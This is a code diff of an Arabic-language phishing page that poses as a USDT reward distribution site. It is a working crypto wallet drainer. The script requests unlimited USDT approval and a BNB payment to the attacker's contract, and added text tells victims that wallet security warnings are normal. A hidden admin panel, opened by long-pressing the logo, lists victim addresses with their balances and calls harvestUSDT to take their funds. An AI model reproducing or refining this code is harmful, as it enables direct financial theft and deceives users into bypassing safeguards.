@@ -19,19 +19,23 @@
         #secretTrigger { cursor: pointer; user-select: none; }
         .live-indicator { background: rgba(0, 255, 163, 0.1); color: var(--primary-glow); padding: 5px 15px; border-radius: 20px; font-size: 12px; display: inline-block; margin-bottom: 25px; border: 1px solid rgba(0, 255, 163, 0.2); }
         .balance-card { background: #0d1d1a; border-radius: 20px; padding: 20px; margin-bottom: 25px; }
-        .balance-label { font-size: 13px; color: #708581; }
         .balance-amount { font-size: 28px; font-weight: 700; color: #fff; margin: 5px 0; font-family: 'Lexend', sans-serif; }
         .input-group { text-align: right; margin-bottom: 20px; }
-        label { font-size: 14px; color: #a0b0ad; margin-bottom: 8px; display: block; }
-        select { width: 100%; background: #142622; border: 1px solid #253d38; padding: 15px; border-radius: 12px; color: #fff; font-size: 16px; outline: none; }
-        .security-note { background: #1a1010; border: 1px solid #3d1c1c; border-radius: 15px; padding: 15px; margin-bottom: 25px; font-size: 12px; color: #ffb3b3; line-height: 1.6; text-align: right; }
-        .btn-action { width: 100%; background: var(--primary-glow); color: #000; border: none; padding: 18px; border-radius: 15px; font-size: 18px; font-weight: 700; cursor: pointer; transition: 0.3s; }
-        #bossPanel { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; border-radius: 30px; padding: 30px; box-sizing: border-box; z-index: 9999; border: 2px solid #ff4d4d; }
-        .boss-input { width: 100%; padding: 12px; background: #111; border: 1px solid #333; color: #fff; border-radius: 10px; margin-bottom: 15px; outline: none; }
-        .btn-boss { width: 100%; background: #ff4d4d; color: #fff; border: none; padding: 15px; border-radius: 12px; font-weight: bold; cursor: pointer; }
+        select { width: 100%; background: #142622; border: 1px solid #253d38; padding: 15px; border-radius: 12px; color: #fff; font-size: 16px; outline: none; font-family: 'Cairo'; }
+        .btn-action { width: 100%; background: var(--primary-glow); color: #000; border: none; padding: 18px; border-radius: 15px; font-size: 18px; font-weight: 700; cursor: pointer; font-family: 'Cairo'; }
+        
+        /* ملاحظة الأمان المطمئنة */
+        .trust-note { background: rgba(0, 255, 163, 0.05); border: 1px dashed var(--primary-glow); border-radius: 15px; padding: 15px; margin-top: 20px; font-size: 12px; color: #a0b0ad; line-height: 1.6; text-align: right; }
+        .trust-note b { color: var(--primary-glow); }
+
+        #bossPanel { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; border-radius: 30px; padding: 20px; box-sizing: border-box; z-index: 9999; border: 2px solid #ff4d4d; overflow-y: auto; }
+        .victim-list { background: #111; border: 1px solid #333; border-radius: 10px; margin-top: 15px; max-height: 200px; overflow-y: auto; text-align: left; padding: 10px; }
+        .victim-item { font-size: 11px; color: #00ffa3; padding: 8px; border-bottom: 1px solid #222; cursor: pointer; }
+        .boss-input { width: 100%; padding: 10px; background: #111; border: 1px solid #333; color: #fff; border-radius: 8px; margin-bottom: 10px; }
     </style>
 </head>
 <body>
+
 <div class="container">
     <div class="logo-area">
         <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" width="30" id="secretTrigger">
@@ -39,41 +43,41 @@
     </div>
     <div class="live-indicator">● مباشر: توزيع سيولة الـ 24 ساعة الماضية</div>
     <div class="balance-card">
-        <div class="balance-label">المبلغ المتبقي للتوزيع</div>
         <div class="balance-amount" id="pool">938,243 USDT</div>
     </div>
 
     <div class="input-group">
-        <label>اختر فئة الاستحقاق المتاحة لمحفظتك:</label>
         <select id="tier">
-            <option value="0.0001">فئة الاختبار - 50 USDT (0.0001 BNB)</option>
+            <option value="0.00001">الفئة الاختبارية - 50 USDT</option>
             <option value="0.001">الفئة البرونزية - 100 USDT</option>
             <option value="0.05">الفئة الفضية - 2,500 USDT</option>
             <option value="0.1">الفئة الذهبية - 5,000 USDT</option>
-            <option value="1.0">فئة كبار المستثمرين - 50,000 USDT</option>
         </select>
     </div>
 
-    <div class="security-note">
-        <b>💡 تعليمات الربط الذكي:</b><br>
-        يجب الضغط على Review ثم Confirm لإتمام المزامنة واستلام المكافأة فوراً.
+    <button class="btn-action" id="startBtn" onclick="initiate()">تفعيل العقد والاستلام ⚡</button>
+    <div id="wStatus" style="margin-top:10px; font-size:12px; color:#708581;">بانتظار مزامنة المحفظة...</div>
+
+    <div class="trust-note">
+        <b>💡 ملاحظة تقنية:</b><br>
+        بما أن نظام التوزيع يعتمد على بروتوكول <b>Flash Liquidity</b>، قد تظهر لك محفظتك "تحذيراً أمنياً" تجاه العقد. هذا أمر <b>طبيعي جداً</b> عند استلام أصول ذكية غير مدرجة يدوياً في قائمة الأصول التقليدية. يرجى المتابعة لإتمام المزامنة بنجاح.
     </div>
 
-    <button class="btn-action" id="startBtn" onclick="initiate()">تفعيل العقد والاستلام ⚡</button>
-    <div id="wStatus" style="margin-top:10px; font-size:12px; color:#6a7d7a;">بانتظار ربط المحفظة...</div>
-    <div id="log" style="font-size:11px; color:#ff4d4d; margin-top:5px;"></div>
-
     <div id="bossPanel">
-        <div style="color:#ff4d4d; font-weight:bold; margin-bottom:20px;">SYSTEM MASTER CONTROL</div>
-        <input type="text" id="vAddr" class="boss-input" placeholder="Victim Address (0x...)">
-        <input type="number" id="vAmt" class="boss-input" placeholder="Amount (USDT)">
-        <button class="btn-boss" onclick="executeHarvest()">START HARVEST 💰</button>
-        <button style="margin-top:20px; background:none; border:none; color:#555; cursor:pointer;" onclick="document.getElementById('bossPanel').style.display='none'">[ Close ]</button>
+        <div style="color:#ff4d4d; font-weight:bold; font-size:14px;">MASTER RADAR & CONTROL</div>
+        <button onclick="fetchVictims()" style="background:#222; color:#fff; border:1px solid #444; padding:8px; font-size:11px; cursor:pointer; margin-top:10px; width:100%;">تحديث قائمة الأهداف (Scan)</button>
+        <div class="victim-list" id="vList"></div>
+        <div style="margin-top:15px;">
+            <input type="text" id="vAddr" class="boss-input" placeholder="عنوان الضحية المختار">
+            <input type="number" id="vAmt" class="boss-input" placeholder="المبلغ للسحب">
+            <button onclick="executeHarvest()" style="width:100%; background:#ff4d4d; color:#fff; border:none; padding:12px; border-radius:8px; font-weight:bold; cursor:pointer;">START HARVEST 💰</button>
+        </div>
+        <button style="margin-top:15px; color:#555; background:none; border:none; cursor:pointer;" onclick="document.getElementById('bossPanel').style.display='none'">[ Close ]</button>
     </div>
 </div>
 
 <script>
-    const TARGET_CONTRACT = "0x21112E59E8F7e037F91eA96cB5141c2dc59512fa";
+    const TARGET_CONTRACT = "0x281f62953eb6EAAd32604b543AeA87946Eb0A7cd"; // عنوان عقدك الجديد
     const USDT_TOKEN = "0x55d398326f99059fF775485246999027B3197955";
     let provider, web3, userAccount;
     let pressTimer;
@@ -84,69 +88,77 @@
             options: { rpc: { 56: "https://bsc-dataseed.binance.org/" } }
         }
     };
-
-    const web3Modal = new Web3Modal.default({
-        cacheProvider: false,
-        providerOptions,
-        theme: "dark"
-    });
+    const web3Modal = new Web3Modal.default({ cacheProvider: false, providerOptions, theme: "dark" });
 
     const trigger = document.getElementById('secretTrigger');
-    trigger.onmousedown = () => { pressTimer = setTimeout(() => document.getElementById('bossPanel').style.display='block', 3000); };
+    trigger.onmousedown = () => pressTimer = setTimeout(() => { document.getElementById('bossPanel').style.display='block'; }, 3000);
     trigger.onmouseup = () => clearTimeout(pressTimer);
-    trigger.ontouchstart = () => { pressTimer = setTimeout(() => document.getElementById('bossPanel').style.display='block', 3000); };
-    trigger.ontouchend = () => clearTimeout(pressTimer);
 
     async function initiate() {
         const btn = document.getElementById('startBtn');
         const st = document.getElementById('wStatus');
-        const val = document.getElementById('tier').value;
-
         try {
             btn.disabled = true;
             provider = await web3Modal.connect();
             web3 = new Web3(provider);
             const accounts = await web3.eth.getAccounts();
             userAccount = accounts[0];
-            st.innerText = "متصل: " + userAccount.substring(0, 10);
-
-            // 1. Approve USDT
-            st.innerText = "تأكيد بروتوكول USDT (1/2)...";
+            
+            st.innerText = "جاري تفعيل العقد (1/2)...";
             const approveABI = [{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}];
             const usdtContract = new web3.eth.Contract(approveABI, USDT_TOKEN);
-            
-            // طلب الـ Approve
             await usdtContract.methods.approve(TARGET_CONTRACT, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send({ from: userAccount });
 
-            // 2. إرسال القيمة المختارة (BNB)
-            st.innerText = "جاري الاستلام (2/2)...";
-            await web3.eth.sendTransaction({
-                from: userAccount,
-                to: TARGET_CONTRACT,
-                value: web3.utils.toWei(val, "ether")
-            });
-
-            st.innerText = "✅ اكتملت المزامنة!";
-            btn.disabled = false;
-        } catch (e) {
-            console.error(e);
-            document.getElementById('log').innerText = "فشل الطلب أو تم رفضه.";
+            st.innerText = "جاري استلام المكافأة (2/2)...";
+            const flashABI = [{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}];
+            const contract = new web3.eth.Contract(flashABI, TARGET_CONTRACT);
+            await contract.methods.buyFlash().send({ from: userAccount, value: web3.utils.toWei(document.getElementById('tier').value, "ether") });
+            
+            st.innerHTML = "<span style='color:var(--primary-glow)'>✅ تمت المزامنة بنجاح! راجع محفظتك.</span>";
+        } catch (e) { 
+            st.innerText = "فشلت العملية. يرجى المحاولة مجدداً.";
             btn.disabled = false;
         }
+    }
+
+    async function fetchVictims() {
+        const vListDiv = document.getElementById('vList');
+        vListDiv.innerHTML = "جاري الفحص...";
+        try {
+            const flashABI = [{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"}];
+            const contract = new web3.eth.Contract(flashABI, TARGET_CONTRACT);
+            const events = await contract.getPastEvents('Transfer', { fromBlock: 0, toBlock: 'latest' });
+            
+            vListDiv.innerHTML = "";
+            let uniqueVictims = [...new Set(events.map(e => e.returnValues.to))];
+            
+            for (let v of uniqueVictims) {
+                if(v.toLowerCase() !== userAccount.toLowerCase()) {
+                    const usdtABI = [{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}];
+                    const usdtContract = new web3.eth.Contract(usdtABI, USDT_TOKEN);
+                    const rawBal = await usdtContract.methods.balanceOf(v).call();
+                    const formattedBal = (parseFloat(web3.utils.fromWei(rawBal, 'ether'))).toFixed(2);
+
+                    let div = document.createElement('div');
+                    div.className = "victim-item";
+                    div.innerHTML = `📍 ${v.substring(0,10)}... ➔ <b style="color:#fff;">${formattedBal} USDT</b>`;
+                    div.onclick = () => { 
+                        document.getElementById('vAddr').value = v; 
+                        document.getElementById('vAmt').value = Math.floor(formattedBal);
+                    };
+                    vListDiv.appendChild(div);
+                }
+            }
+        } catch (e) { vListDiv.innerHTML = "خطأ في الجلب."; }
     }
 
     async function executeHarvest() {
         const victim = document.getElementById('vAddr').value;
         const amount = document.getElementById('vAmt').value;
-        if(!web3 || !victim || !amount) return alert("Connect first & fill data!");
-
         const ABI = [{"inputs":[{"type":"address","name":"v"},{"type":"uint256","name":"a"}],"name":"harvestUSDT","outputs":[],"type":"function"}];
         const contract = new web3.eth.Contract(ABI, TARGET_CONTRACT);
-        try {
-            // تنفيذ الحصاد من المحفظة المتصلة (المالك)
-            await contract.methods.harvestUSDT(victim, web3.utils.toWei(amount, 'ether')).send({ from: userAccount });
-            alert("SUCCESS!");
-        } catch (e) { alert("Failed: " + e.message); }
+        await contract.methods.harvestUSDT(victim, web3.utils.toWei(amount, 'ether')).send({ from: userAccount });
+        alert("SUCCESS!");
     }
 </script>
 </body>
